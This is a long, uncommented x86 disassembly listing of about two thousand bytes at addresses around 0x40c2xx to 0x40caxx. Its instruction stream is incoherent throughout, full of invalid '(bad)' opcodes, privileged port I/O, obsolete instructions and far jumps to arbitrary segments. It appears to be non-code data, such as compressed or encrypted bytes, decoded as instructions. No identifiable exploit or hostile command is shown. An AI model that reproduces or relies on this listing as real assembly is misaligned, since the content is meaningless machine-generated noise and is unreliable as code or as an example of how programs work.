  40c24f:	test   BYTE PTR [eax],0x3
  40c252:	pusha  
  40c253:	arpl   WORD PTR [edx+ebp*1-0x52],si
  40c257:	cmp    eax,0xf14ed65a
  40c25c:	int    0xcf
  40c25e:	mov    DWORD PTR [edx+ebp*2+0x2b],esp
  40c262:	jecxz  0x40c2c4
  40c264:	push   ebp
  40c265:	mov    ds:0xffcaca9e,al
  40c26a:	test   al,0x7c
  40c26c:	mov    eax,ds:0x2503226e
  40c271:	cmp    dh,BYTE PTR [ecx]
  40c273:	out    0xa3,eax
  40c275:	and    esp,DWORD PTR [eax+0x65c26667]
  40c27b:	mov    ah,0x78
  40c27d:	add    esp,DWORD PTR [eax]
  40c27f:	adc    al,0x67
  40c281:	jns    0x40c219
  40c283:	(bad)  
  40c284:	in     al,dx
  40c285:	mov    esp,0xcc74372b
  40c28a:	jmp    0xca58d743
  40c28f:	cld    
  40c290:	xchg   edi,eax
  40c291:	retf   0x22b9
  40c294:	and    edx,0x795dae93
  40c29a:	mov    al,ds:0x24fdebf6
  40c29f:	add    esp,DWORD PTR [ecx-0x5fdab95c]
  40c2a5:	pop    ebx
  40c2a6:	mov    eax,ds:0xf13fdb28
  40c2ab:	les    esp,FWORD PTR [edx]
  40c2ad:	out    0xc3,al
  40c2af:	lds    esp,FWORD PTR [ecx-0xbbedf0a]
  40c2b5:	(bad)  
  40c2b6:	push   ds
  40c2b7:	shl    BYTE PTR [edx-0x34f49788],cl
  40c2bd:	into   
  40c2be:	xchg   ecx,eax
  40c2bf:	jle    0x40c266
  40c2c1:	in     al,0xf7
  40c2c3:	xor    BYTE PTR [edi],0x3a
  40c2c6:	(bad)  
  40c2c7:	push   ss
  40c2c8:	adc    al,0x94
  40c2ca:	scas   eax,DWORD PTR es:[edi]
  40c2cb:	addr16 nop
  40c2cd:	bound  esi,QWORD PTR ds:0x713d5dc
  40c2d3:	pop    ds
  40c2d4:	pop    ebx
  40c2d5:	(bad)  
  40c2d6:	cld    
  40c2d7:	(bad)  
  40c2d8:	aam    0xaa
  40c2da:	mov    ebx,0xa11a2c67
  40c2df:	arpl   WORD PTR [ebx-0x34],ax
  40c2e2:	mov    esp,DWORD PTR [ebp+0x39]
  40c2e5:	sub    edx,ecx
  40c2e7:	leave  
  40c2e8:	fnstenv [eax-0x2f]
  40c2eb:	inc    esi
  40c2ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2ed:	rcr    DWORD PTR [ebx-0x513d5312],1
  40c2f3:	xlat   BYTE PTR ds:[ebx]
  40c2f4:	icebp  
  40c2f5:	jp     0x40c365
  40c2f7:	loop   0x40c333
  40c2f9:	adc    bh,BYTE PTR [edx-0x5b]
  40c2fc:	ret    0xc981
  40c2ff:	mov    ebp,DWORD PTR [edi+0xc]
  40c302:	inc    ebp
  40c303:	jns    0x40c344
  40c305:	and    cl,BYTE PTR [eax]
  40c307:	ficomp WORD PTR [eax]
  40c309:	mov    esp,0x3b97f9f8
  40c30e:	jl     0x40c35e
  40c310:	stos   DWORD PTR es:[edi],eax
  40c311:	mov    eax,0xb1c0b0c4
  40c316:	mov    al,0xf8
  40c318:	jp     0x40c30a
  40c31a:	xor    ebx,DWORD PTR cs:[esi+0x4f]
  40c31e:	dec    ebx
  40c31f:	hlt    
  40c320:	cmp    ch,bh
  40c322:	mov    esp,0x2d53bc8
  40c327:	inc    esi
  40c328:	pop    ecx
  40c329:	push   0xffffffb7
  40c32b:	or     eax,0x976f3775
  40c330:	enter  0xe8a4,0x82
  40c334:	jecxz  0x40c354
  40c336:	mov    al,ds:0x28ff4ae5
  40c33b:	mov    al,ds:0xa188a4c5
  40c340:	xor    BYTE PTR [esi-0x2fb7bc36],dl
  40c346:	imul   esp,DWORD PTR [edi],0x65b3e5cb
  40c34c:	outs   dx,DWORD PTR ds:[esi]
  40c34d:	hlt    
  40c34e:	mov    WORD PTR [esi+0x1414cc84],fs
  40c354:	adc    cl,ah
  40c356:	scas   al,BYTE PTR es:[edi]
  40c357:	daa    
  40c358:	fneni(8087 only) 
  40c35a:	and    BYTE PTR [ebp+0x21],al
  40c35d:	push   ebp
  40c35e:	push   ebp
  40c35f:	gs pusha 
  40c361:	pusha  
  40c362:	aaa    
  40c363:	xchg   esp,eax
  40c364:	mov    ecx,0x15682190
  40c369:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c36a:	push   0x75899e87
  40c36f:	fild   DWORD PTR [esi]
  40c371:	test   ecx,esi
  40c373:	loop   0x40c33b
  40c375:	jmp    0xecc4:0x99d11f2a
  40c37c:	ret    
  40c37d:	into   
  40c37e:	xchg   edi,eax
  40c37f:	icebp  
  40c380:	test   eax,0x31ec67e9
  40c385:	pop    eax
  40c386:	mov    ebx,0x9713e378
  40c38b:	lods   al,BYTE PTR ds:[esi]
  40c38c:	fstp   TBYTE PTR [ecx+edx*8]
  40c38f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c390:	das    
  40c391:	pop    edi
  40c392:	dec    ebx
  40c393:	mov    ds:0xef3d8448,al
  40c398:	ins    DWORD PTR es:[edi],dx
  40c399:	out    dx,eax
  40c39a:	cs sbb eax,0x6235b722
  40c3a0:	(bad)  
  40c3a2:	pop    ds
  40c3a3:	popa   
  40c3a4:	int    0xec
  40c3a6:	fdivr  DWORD PTR fs:[ebx]
  40c3a9:	aad    0x59
  40c3ab:	and    eax,0x80df6ef8
  40c3b0:	sahf   
  40c3b1:	add    edx,DWORD PTR [edx-0x53a63ffb]
  40c3b7:	fs enter 0x9cb5,0x3
  40c3bc:	xor    esi,DWORD PTR [eax+0x32bbc5e3]
  40c3c2:	mov    edx,0x5cdc01de
  40c3c7:	call   0xdfff:0x623ae7b4
  40c3ce:	adc    bl,dl
  40c3d0:	lds    esp,FWORD PTR [edi-0x576d9d68]
  40c3d6:	and    dl,BYTE PTR [edi+0x75]
  40c3d9:	xor    DWORD PTR [eax],edx
  40c3db:	xchg   ebx,eax
  40c3dc:	fs inc eax
  40c3de:	popa   
  40c3df:	in     eax,0xe
  40c3e1:	pop    ss
  40c3e2:	sar    DWORD PTR [edi-0x70],1
  40c3e5:	and    al,0x8
  40c3e7:	sub    DWORD PTR [ecx],eax
  40c3e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3ea:	jg     0x40c373
  40c3ec:	int    0x79
  40c3ee:	lock jne 0x40c3ed
  40c3f1:	inc    edi
  40c3f2:	push   cs
  40c3f3:	xchg   edx,eax
  40c3f4:	aam    0xd4
  40c3f6:	or     BYTE PTR [eax+0x7b4ca811],bl
  40c3fc:	ss (bad) 
  40c3fe:	and    DWORD PTR [edi+0x73],ecx
  40c401:	pop    eax
  40c402:	push   ss
  40c403:	mov    dh,0xf9
  40c405:	mov    dl,0xd4
  40c407:	jp     0x40c3dc
  40c409:	imul   edi,DWORD PTR [edi-0x47c7b5c5],0xf256418
  40c413:	cmp    eax,0x2f1e40a7
  40c418:	outs   dx,BYTE PTR ds:[esi]
  40c419:	mov    eax,ds:0xb10d4c46
  40c41e:	lods   al,BYTE PTR ds:[esi]
  40c41f:	imul   ebx,ebx,0xdc0b0970
  40c425:	pop    ecx
  40c426:	out    0xf9,al
  40c428:	adc    ch,BYTE PTR [ebx+0x10322715]
  40c42e:	xor    cl,BYTE PTR [eax]
  40c430:	icebp  
  40c431:	or     eax,0xdcb2a494
  40c436:	pusha  
  40c437:	pop    edx
  40c438:	rcr    BYTE PTR [edi-0x152ff77a],0x8a
  40c43f:	or     eax,0xd41700fa
  40c445:	daa    
  40c446:	test   al,0xae
  40c448:	shl    BYTE PTR [esi+0xa9e249b],cl
  40c44e:	fcomp  QWORD PTR [eax+0x30]
  40c451:	lea    ebx,[edi+0x1d5df762]
  40c457:	adc    ebp,DWORD PTR [ebx+0xaa6186c]
  40c45d:	pop    ds
  40c45e:	pop    ebp
  40c45f:	mov    eax,ds:0x79abb277
  40c464:	or     al,0x39
  40c466:	xor    bh,BYTE PTR [edi+0x15]
  40c469:	push   ebx
  40c46a:	jae    0x40c47b
  40c46c:	out    dx,eax
  40c46d:	data16 cli 
  40c46f:	or     al,0x87
  40c471:	cmp    al,0xf
  40c473:	mov    ah,0x1b
  40c475:	repz xchg al,cl
  40c478:	cmp    dl,ah
  40c47a:	mov    esi,0x48630dbc
  40c47f:	cmp    ah,bl
  40c481:	daa    
  40c482:	les    esi,FWORD PTR [edx-0x580460f3]
  40c488:	push   esi
  40c489:	adc    edx,DWORD PTR [ecx-0x41ca306a]
  40c48f:	xor    al,0xa1
  40c491:	loop   0x40c4e9
  40c493:	cmp    al,0xc8
  40c495:	inc    edx
  40c496:	mov    BYTE PTR [edx+0x2e],al
  40c499:	mov    WORD PTR [eax-0x4246642b],gs
  40c49f:	add    DWORD PTR [edx-0x76eaeb6e],ebx
  40c4a5:	scas   eax,DWORD PTR es:[edi]
  40c4a6:	fwait
  40c4a7:	lods   eax,DWORD PTR ds:[esi]
  40c4a8:	jb     0x40c4fb
  40c4aa:	xchg   ebx,eax
  40c4ab:	imul   eax,DWORD PTR [eax+0x42806701],0x41e46d2c
  40c4b5:	into   
  40c4b6:	cmp    bl,dh
  40c4b8:	jge    0x40c43b
  40c4ba:	mov    al,0x58
  40c4bc:	xor    al,0x86
  40c4be:	cli    
  40c4bf:	xor    dl,BYTE PTR [ebp-0x7d]
  40c4c2:	jae    0x40c503
  40c4c4:	out    0xbb,eax
  40c4c6:	lea    esi,[ebp-0x4ac7d765]
  40c4cc:	cmp    al,0x53
  40c4ce:	push   edx
  40c4cf:	ret    0x6ba9
  40c4d2:	jns    0x40c4ce
  40c4d4:	push   eax
  40c4d5:	icebp  
  40c4d6:	cmc    
  40c4d7:	aaa    
  40c4d8:	stos   BYTE PTR es:[edi],al
  40c4d9:	clc    
  40c4da:	sub    BYTE PTR [eax],dl
  40c4dc:	jl     0x40c499
  40c4de:	and    edx,eax
  40c4e0:	gs in  al,0xe8
  40c4e3:	test   DWORD PTR [ebp+ebx*2+0x5d],edx
  40c4e7:	sub    DWORD PTR [eax-0x43],ebx
  40c4ea:	xor    eax,0xaad5e1b7
  40c4ef:	imul   eax,ebx,0xffffffb9
  40c4f2:	xor    al,0xa1
  40c4f4:	dec    edx
  40c4f5:	mov    esi,0x898b5aaa
  40c4fa:	retf   0x47e3
  40c4fd:	rcl    DWORD PTR ds:0xf3cf93e0,1
  40c503:	dec    edx
  40c504:	mov    ebp,0xfe66d586
  40c509:	loop   0x40c523
  40c50b:	(bad)  
  40c50c:	(bad)  
  40c50d:	mov    al,BYTE PTR [ecx+0x7f]
  40c510:	sbb    DWORD PTR [edx-0x4452547c],ebp
  40c516:	pop    ds
  40c517:	rcl    esp,cl
  40c519:	add    DWORD PTR [eax-0x52],esp
  40c51c:	pop    edx
  40c51d:	mov    dh,ah
  40c51f:	mov    ebp,esp
  40c521:	pop    edi
  40c522:	out    0x46,al
  40c524:	mov    ebp,0xd5e949cc
  40c529:	fsubr  QWORD PTR [eax+0x258686aa]
  40c52f:	xor    DWORD PTR [edx+0x6c],esp
  40c532:	mov    edi,0x3778c60d
  40c537:	mov    al,ds:0xe7752d19
  40c53c:	ret    0x509b
  40c53f:	daa    
  40c540:	imul   edx,DWORD PTR [edi-0x3b8e7dc7],0xffffffdf
  40c547:	aam    0xba
  40c549:	inc    ebx
  40c54a:	pop    ds
  40c54b:	cs mov ebx,0x84aa960e
  40c551:	mov    eax,ds:0x8955c59a
  40c556:	adc    bl,ah
  40c558:	les    esp,FWORD PTR [esp+ebx*2]
  40c55b:	dec    esi
  40c55c:	cwde   
  40c55d:	leave  
  40c55e:	(bad)  
  40c55f:	jmp    0x8b43:0x1125399a
  40c566:	fcomi  st,st(5)
  40c568:	shr    dl,1
  40c56a:	scas   al,BYTE PTR es:[edi]
  40c56b:	rcr    cl,0x57
  40c56e:	in     al,0x55
  40c570:	cdq    
  40c571:	pusha  
  40c572:	adc    eax,0x1832a779
  40c577:	xchg   ebp,eax
  40c578:	add    ch,0x9b
  40c57b:	out    0xb5,al
  40c57d:	out    dx,al
  40c57e:	clc    
  40c57f:	xchg   ebp,eax
  40c580:	rcl    DWORD PTR [edx-0x7c],0x8e
  40c584:	add    eax,0xbbfcb81c
  40c589:	xor    BYTE PTR [ebx],dh
  40c58b:	out    0xc7,al
  40c58d:	sbb    eax,0x4497c2e0
  40c592:	adc    BYTE PTR [eax-0x34],dl
  40c595:	jp     0x40c544
  40c597:	xor    BYTE PTR [ecx-0x25],dh
  40c59a:	add    al,0x9c
  40c59c:	pop    es
  40c59d:	test   dl,al
  40c59f:	imul   edi,DWORD PTR [edi-0x460b99a6],0xffffffb7
  40c5a6:	not    BYTE PTR ds:0x1af95153
  40c5ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5ad:	pop    es
  40c5ae:	jmp    0x40c551
  40c5b0:	jp     0x40c578
  40c5b2:	jnp    0x40c5e9
  40c5b4:	das    
  40c5b5:	xchg   esp,eax
  40c5b6:	rol    BYTE PTR ds:0xe5f61bcd,cl
  40c5bc:	xchg   esp,eax
  40c5bd:	xchg   esp,eax
  40c5be:	fsubr  QWORD PTR [ebp-0x417519b]
  40c5c4:	xor    dh,BYTE PTR [edi+0xe]
  40c5c7:	leave  
  40c5c8:	sub    al,0xba
  40c5ca:	call   0x35e6a79c
  40c5cf:	in     eax,dx
  40c5d0:	(bad)  
  40c5d2:	ins    BYTE PTR es:[edi],dx
  40c5d3:	xor    al,0xd1
  40c5d5:	ins    BYTE PTR es:[edi],dx
  40c5d6:	popf   
  40c5d7:	(bad)  
  40c5d8:	cli    
  40c5d9:	add    eax,0x55ca4cb1
  40c5de:	xchg   ebp,eax
  40c5df:	(bad)  
  40c5e0:	popf   
  40c5e1:	stos   BYTE PTR es:[edi],al
  40c5e2:	test   eax,0x8c5a860c
  40c5e7:	xor    eax,0x6c831fe8
  40c5ec:	fst    st(0)
  40c5ee:	mov    ebp,0xf009fe54
  40c5f3:	lods   al,BYTE PTR ds:[esi]
  40c5f4:	call   0x46ad:0x6975cb21
  40c5fb:	int    0x4a
  40c5fd:	jg     0x40c63e
  40c5ff:	inc    esi
  40c600:	mov    dl,0x7c
  40c602:	cmp    dl,BYTE PTR [ebx+eiz*1]
  40c605:	ror    BYTE PTR [eax],0xd1
  40c608:	or     edx,edx
  40c60a:	not    BYTE PTR [edi+0x2f]
  40c60d:	adc    DWORD PTR [edi-0x6f],edi
  40c610:	jecxz  0x40c5e8
  40c612:	pop    es
  40c613:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c614:	xor    eax,0x6eaa240c
  40c619:	popf   
  40c61a:	sbb    DWORD PTR [esi+0x23],ebx
  40c61d:	enter  0x776,0x2
  40c621:	sahf   
  40c622:	popa   
  40c623:	mov    ds:0xa9c253b6,al
  40c628:	scas   al,BYTE PTR es:[edi]
  40c629:	cmp    al,bl
  40c62b:	call   0xc495:0xad47b49c
  40c632:	repnz popa 
  40c634:	test   BYTE PTR [esi-0x4c],0xeb
  40c638:	in     al,0x67
  40c63a:	imul   edx,DWORD PTR [ecx-0x36],0xffffff98
  40c63e:	loop   0x40c66b
  40c640:	rep lods al,BYTE PTR ds:[esi]
  40c642:	push   ebp
  40c643:	mov    bl,0x7a
  40c645:	push   eax
  40c646:	in     eax,dx
  40c647:	outs   dx,BYTE PTR ds:[esi]
  40c648:	fmul   QWORD PTR [eax]
  40c64a:	ins    DWORD PTR es:[edi],dx
  40c64b:	bound  esi,QWORD PTR [esi+0x6]
  40c64e:	sahf   
  40c64f:	push   0x6
  40c651:	inc    edi
  40c652:	mov    ah,al
  40c654:	and    DWORD PTR cs:[ebp+0x5051b3ce],edi
  40c65b:	pop    ebx
  40c65c:	retf   
  40c65d:	dec    esp
  40c65e:	je     0x40c6cc
  40c660:	add    al,0x10
  40c662:	shl    BYTE PTR ds:0x2e6267ff,1
  40c668:	push   esi
  40c669:	xchg   esi,eax
  40c66a:	rcr    BYTE PTR [edi+0x62a71907],1
  40c670:	jmp    0x40c67d
  40c672:	xchg   esp,eax
  40c673:	lea    ecx,[eax]
  40c675:	or     eax,0x83b33bb7
  40c67a:	shr    BYTE PTR [ebp+0x5492a020],1
  40c680:	xor    dl,BYTE PTR [edi-0x46]
  40c683:	mov    ds:0xaa8c49f1,al
  40c688:	inc    eax
  40c689:	(bad)  
  40c68a:	mov    dl,0x35
  40c68c:	mov    DWORD PTR [eax+eiz*4+0x3b],esp
  40c690:	mov    esi,0xf710139e
  40c695:	xchg   esi,eax
  40c696:	jle    0x40c6b0
  40c698:	pop    es
  40c699:	rol    BYTE PTR [edi+0x4c6b4ba5],0x8a
  40c6a0:	mov    dh,0xcb
  40c6a2:	jno    0x40c674
  40c6a4:	sub    al,0x68
  40c6a6:	inc    eax
  40c6a7:	fild   WORD PTR [ebp-0x58a883c2]
  40c6ad:	jge    0x40c64d
  40c6af:	imul   ebx,DWORD PTR [ebx+0xdae9d3f],0x23
  40c6b6:	inc    edx
  40c6b7:	sbb    bh,al
  40c6b9:	pop    esi
  40c6ba:	lea    esi,[ecx+0x6cf3a360]
  40c6c0:	jbe    0x40c69c
  40c6c2:	jl     0x40c662
  40c6c4:	xor    ebp,DWORD PTR [eax+0x38]
  40c6c7:	add    ebp,edi
  40c6c9:	pop    esp
  40c6ca:	fs or  al,0xac
  40c6cd:	in     eax,0xf1
  40c6cf:	jp     0x40c6e7
  40c6d1:	or     al,BYTE PTR [esi+0x26]
  40c6d4:	xor    BYTE PTR [edx-0x60c59e21],al
  40c6da:	(bad)  
  40c6db:	out    dx,al
  40c6dc:	aam    0x2e
  40c6de:	dec    ecx
  40c6df:	adc    BYTE PTR [ebx],ah
  40c6e1:	mov    eax,ds:0x4f336af6
  40c6e6:	sar    DWORD PTR [ebx+0x15],0x7b
  40c6ea:	mov    eax,0xf0a835e7
  40c6ef:	enter  0x39ee,0xd6
  40c6f3:	xchg   BYTE PTR [ecx+0x7b23bc7d],al
  40c6f9:	sbb    DWORD PTR [edx],esi
  40c6fb:	das    
  40c6fc:	add    DWORD PTR fs:[ebx+0x11],ebp
  40c700:	push   ebp
  40c701:	mov    ecx,0xbc916598
  40c706:	jb     0x40c6c6
  40c708:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c709:	pop    edi
  40c70a:	scas   al,BYTE PTR es:[edi]
  40c70b:	loop   0x40c6b1
  40c70d:	mov    eax,0x1f4bd571
  40c712:	sub    eax,0x54420c66
  40c717:	inc    eax
  40c718:	repz (bad) [eax+0x755aa2b]
  40c71f:	dec    esi
  40c720:	cmc    
  40c721:	mov    bh,BYTE PTR [edx]
  40c723:	ret    0xeda2
  40c726:	mov    al,ds:0xfe54d37f
  40c72b:	ret    
  40c72c:	jo     0x40c6d5
  40c72e:	push   ss
  40c72f:	or     DWORD PTR [edi+ecx*2],eax
  40c732:	dec    esi
  40c733:	scas   eax,DWORD PTR es:[edi]
  40c734:	or     BYTE PTR [ecx],ah
  40c736:	push   ebp
  40c737:	add    BYTE PTR [eax+0x75e7678b],bl
  40c73d:	js     0x40c78d
  40c73f:	xchg   edx,eax
  40c740:	fild   QWORD PTR [edi]
  40c742:	xchg   ebp,ebx
  40c744:	cmp    al,0x71
  40c746:	stc    
  40c747:	lahf   
  40c748:	aam    0xc
  40c74a:	push   0x77
  40c74c:	cdq    
  40c74d:	test   eax,0xb00348ab
  40c752:	xchg   BYTE PTR [ebx-0x27aacf79],dl
  40c758:	adc    eax,0xe00cb232
  40c75d:	sar    DWORD PTR [edx+0x770ac20e],cl
  40c763:	jnp    0x40c72a
  40c765:	repnz or eax,0x7da9a168
  40c76b:	cs mov esp,0x1762dfed
  40c771:	cmp    WORD PTR [eax],sp
  40c774:	mov    bl,0x9c
  40c776:	clc    
  40c777:	ja     0x40c706
  40c779:	clc    
  40c77a:	adc    BYTE PTR [esi-0x7ff37278],al
  40c780:	cli    
  40c781:	jmp    FWORD PTR [esi-0x5d460d85]
  40c787:	in     al,0x21
  40c789:	ja     0x40c799
  40c78b:	(bad)  
  40c78c:	pop    edx
  40c78d:	or     eax,0x5cacc3f3
  40c792:	rcr    BYTE PTR [ecx+0x2c9e3f0e],1
  40c798:	push   es
  40c799:	jno    0x40c7b0
  40c79b:	push   ebp
  40c79c:	pushf  
  40c79d:	stc    
  40c79e:	sub    DWORD PTR [esi],ecx
  40c7a0:	mov    al,0x92
  40c7a2:	mov    ds:0x2a0d8ed7,eax
  40c7a7:	add    eax,0x7b1865d0
  40c7ac:	out    0xd2,al
  40c7ae:	jo     0x40c80f
  40c7b0:	xchg   ebp,eax
  40c7b1:	gs out dx,eax
  40c7b3:	ds and al,0xa8
  40c7b6:	outs   dx,DWORD PTR ds:[esi]
  40c7b7:	lahf   
  40c7b8:	push   cs
  40c7b9:	stc    
  40c7ba:	cs icebp 
  40c7bc:	or     bh,BYTE PTR fs:[ebp+0x30588603]
  40c7c3:	push   ebx
  40c7c4:	xlat   BYTE PTR ds:[ebx]
  40c7c5:	jb     0x40c7ea
  40c7c7:	shr    BYTE PTR [edx+0x6d],0xd2
  40c7cb:	out    0xec,al
  40c7cd:	inc    ebp
  40c7ce:	or     dl,BYTE PTR [esi+0x7]
  40c7d1:	sub    eax,0x573069e9
  40c7d6:	or     ah,BYTE PTR [ebx+0x73cdf10c]
  40c7dc:	jle    0x40c769
  40c7de:	pop    eax
  40c7df:	push   edi
  40c7e0:	hlt    
  40c7e1:	outs   dx,BYTE PTR ds:[esi]
  40c7e2:	lea    edi,[ebp+esi*4-0x2d]
  40c7e6:	push   edi
  40c7e7:	das    
  40c7e8:	(bad)  
  40c7e9:	and    eax,0xd493d70e
  40c7ee:	enter  0x9273,0x79
  40c7f2:	fwait
  40c7f3:	push   esi
  40c7f4:	xchg   esi,eax
  40c7f5:	adc    dl,BYTE PTR [ebx-0x7f2f02ee]
  40c7fb:	push   edx
  40c7fc:	(bad)  
  40c7fd:	aaa    
  40c7fe:	xchg   ecx,eax
  40c7ff:	and    eax,DWORD PTR [edi-0x42]
  40c802:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c803:	scas   al,BYTE PTR es:[edi]
  40c804:	imul   edi,DWORD PTR [edx],0x11
  40c807:	pop    ebx
  40c808:	loope  0x40c804
  40c80a:	xor    ah,BYTE PTR [edi]
  40c80c:	jne    0x40c7ee
  40c80e:	jae    0x40c7a3
  40c810:	ja     0x40c85f
  40c812:	sub    bl,dl
  40c814:	xor    BYTE PTR [eax+0x62],ch
  40c817:	mov    DWORD PTR [edx+0x4d5305f3],edx
  40c81d:	add    dh,BYTE PTR [esi+esi*1-0x47554864]
  40c824:	jnp    0x40c7da
  40c826:	pusha  
  40c827:	test   al,0xc7
  40c829:	push   DWORD PTR [eax+0x68232edb]
  40c82f:	push   ss
  40c830:	inc    edi
  40c831:	or     edx,DWORD PTR [esi]
  40c833:	ffree  st(3)
  40c835:	imul   edx,esp,0xa85e3584
  40c83b:	pop    ecx
  40c83c:	push   ss
  40c83d:	(bad)  
  40c83f:	aad    0x39
  40c841:	imul   eax,DWORD PTR [edi-0x1c],0x2c
  40c845:	xlat   BYTE PTR ds:[ebx]
  40c846:	xchg   ecx,eax
  40c847:	xor    DWORD PTR [ebp-0x75527778],esp
  40c84d:	test   cl,dl
  40c84f:	push   0xb3b05abf
  40c854:	daa    
  40c855:	test   al,0x83
  40c857:	mov    ecx,0xce284dde
  40c85c:	imul   esp,DWORD PTR ds:0x462d2189,0x79
  40c863:	scas   eax,DWORD PTR es:[edi]
  40c864:	mov    ebx,0x94b825d6
  40c869:	dec    eax
  40c86a:	push   edi
  40c86b:	or     ebp,DWORD PTR [eax+0x3f]
  40c86e:	push   ecx
  40c86f:	mov    ebx,0x8a58c723
  40c874:	in     al,dx
  40c875:	gs int 0x78
  40c878:	rcr    ah,1
  40c87a:	inc    edx
  40c87b:	faddp  st(6),st
  40c87d:	ret    
  40c87e:	and    al,0xbd
  40c880:	push   eax
  40c881:	fsub   DWORD PTR [edi]
  40c883:	pop    esi
  40c884:	adc    edx,DWORD PTR ds:0x2107ce5f
  40c88a:	add    BYTE PTR [eax-0x35b4221d],0x9a
  40c891:	xchg   ebx,eax
  40c892:	push   cs
  40c893:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c894:	sbb    ah,BYTE PTR [ebp-0x2]
  40c897:	dec    edx
  40c898:	mov    esp,0x1293c60f
  40c89d:	push   ecx
  40c89e:	cld    
  40c89f:	into   
  40c8a0:	mov    dh,0xe6
  40c8a2:	aas    
  40c8a3:	xor    esp,esi
  40c8a5:	mov    ebx,0x73e0b9b0
  40c8aa:	pushf  
  40c8ab:	sub    ecx,DWORD PTR [esi]
  40c8ad:	(bad)  
  40c8ae:	loop   0x40c876
  40c8b0:	xchg   BYTE PTR [eax-0x25daf449],bl
  40c8b6:	imul   ebp,DWORD PTR [eax],0x4b
  40c8b9:	inc    eax
  40c8ba:	cld    
  40c8bb:	mov    ebx,0x9dc0df41
  40c8c0:	pop    esi
  40c8c1:	ret    
  40c8c2:	fisubr WORD PTR [ecx+ecx*4+0x61391231]
  40c8c9:	jecxz  0x40c863
  40c8cb:	aas    
  40c8cc:	imul   esi,DWORD PTR [ebx],0xffffffd5
  40c8cf:	pop    ss
  40c8d0:	or     eax,0x545400b4
  40c8d5:	out    0x1d,eax
  40c8d7:	imul   esi,DWORD PTR [edx-0x17],0xc771985e
  40c8de:	mov    ebp,DWORD PTR [esi-0xf0a62a1]
  40c8e4:	cmc    
  40c8e5:	dec    eax
  40c8e6:	cmp    BYTE PTR [edi-0x1f6081ef],dl
  40c8ec:	mov    esi,0x91205f7f
  40c8f1:	and    eax,0x2f55cbc
  40c8f6:	pop    es
  40c8f7:	jns    0x40c88b
  40c8f9:	push   esp
  40c8fa:	stos   DWORD PTR es:[edi],eax
  40c8fb:	mov    ecx,0x5f6c523c
  40c900:	and    esi,esi
  40c902:	inc    eax
  40c903:	repnz fs out dx,eax
  40c906:	mov    ecx,0x4acef739
  40c90b:	adc    DWORD PTR ds:0x7aa08539,ebx
  40c911:	xor    DWORD PTR [esi+esi*4-0x381372c6],esi
  40c918:	cmp    ecx,0xffffffc7
  40c91b:	test   al,0x49
  40c91d:	pop    ebx
  40c91e:	mov    dh,0x13
  40c920:	mov    bl,0x40
  40c922:	mov    ds:0x83867915,eax
  40c927:	or     eax,0x3f4a4d71
  40c92c:	mov    dl,0x57
  40c92e:	sub    cl,bh
  40c930:	es scas al,BYTE PTR es:[edi]
  40c932:	or     dl,dh
  40c934:	imul   ebx,DWORD PTR [ebp-0x5b5a5fb8],0x7c
  40c93b:	xchg   ebp,eax
  40c93c:	int3   
  40c93d:	jg     0x40c99c
  40c93f:	lea    edi,[ebp+0xcc7f685]
  40c945:	sub    al,0x2f
  40c947:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c948:	mov    ebx,0x5a1ff881
  40c94d:	(bad)  
  40c94f:	(bad)  
  40c950:	rol    DWORD PTR [ebx+0x21],cl
  40c953:	pop    edx
  40c954:	jmp    0xffa2:0xdb9b9224
  40c95b:	or     eax,0x8b146892
  40c960:	pusha  
  40c961:	sbb    eax,0x326d632a
  40c966:	mov    dl,0x6e
  40c968:	mov    edi,0x356a38b9
  40c96d:	mov    eax,ds:0xc962b108
  40c972:	or     ax,0xe3b2
  40c976:	lock push esp
  40c978:	arpl   di,bp
  40c97a:	jnp    0x40c95f
  40c97c:	xlat   BYTE PTR ds:[ebx]
  40c97d:	pop    ecx
  40c97e:	adc    bh,BYTE PTR [edi-0x4397bab]
  40c984:	jg     0x40c9a3
  40c986:	shl    bl,1
  40c988:	mov    esi,0xcf7b1968
  40c98d:	and    DWORD PTR [ebx-0x54bcf6b7],edx
  40c993:	icebp  
  40c994:	xchg   ebp,eax
  40c995:	cmc    
  40c996:	fwait
  40c997:	or     al,0xfb
  40c999:	(bad)  
  40c99a:	sub    al,0x80
  40c99c:	mov    cl,0xeb
  40c99e:	cmc    
  40c99f:	jae    0x40c969
  40c9a1:	jno    0x40c9b0
  40c9a3:	pusha  
  40c9a4:	mov    al,ds:0xcb88a001
  40c9a9:	fnstcw WORD PTR [ecx+0x5be25f70]
  40c9af:	mov    bh,0x7e
  40c9b1:	mov    dl,0x6f
  40c9b3:	dec    ecx
  40c9b4:	test   DWORD PTR [ebp-0xcefb33c],0x36087d6d
  40c9be:	ja     0x40ca02
  40c9c0:	(bad)  
  40c9c1:	and    al,0x9b
  40c9c3:	mov    edx,0x36d9e84d
  40c9c8:	push   ds
  40c9c9:	lahf   
  40c9ca:	stc    
  40c9cb:	pop    es
  40c9cc:	push   edx
  40c9cd:	mov    ebx,0xe6eaac21
  40c9d2:	jmp    0x404bbef1
  40c9d7:	mov    dh,0x67
  40c9d9:	aad    0xee
  40c9db:	clc    
  40c9dc:	inc    edi
  40c9dd:	pop    ds
  40c9de:	mov    edx,0x56f58f3f
  40c9e3:	ins    DWORD PTR es:[edi],dx
  40c9e4:	mov    ch,0x4
  40c9e6:	inc    ebx
  40c9e7:	in     al,dx
  40c9e8:	popa   
  40c9e9:	mov    edi,0x65b25b9f
  40c9ee:	push   edx
  40c9ef:	repnz pop esp
  40c9f1:	scas   al,BYTE PTR es:[edi]
  40c9f2:	push   ds
  40c9f3:	mov    dl,0x34
  40c9f5:	ss in  eax,dx
  40c9f7:	adc    al,0x9f
  40c9f9:	mov    cl,0xb4
  40c9fb:	or     eax,DWORD PTR [edx+0x10]
  40c9fe:	add    al,0xda
  40ca00:	outs   dx,BYTE PTR ds:[esi]
  40ca01:	push   ebx
  40ca02:	outs   dx,BYTE PTR ds:[esi]
  40ca03:	pop    es
  40ca04:	pop    ebx
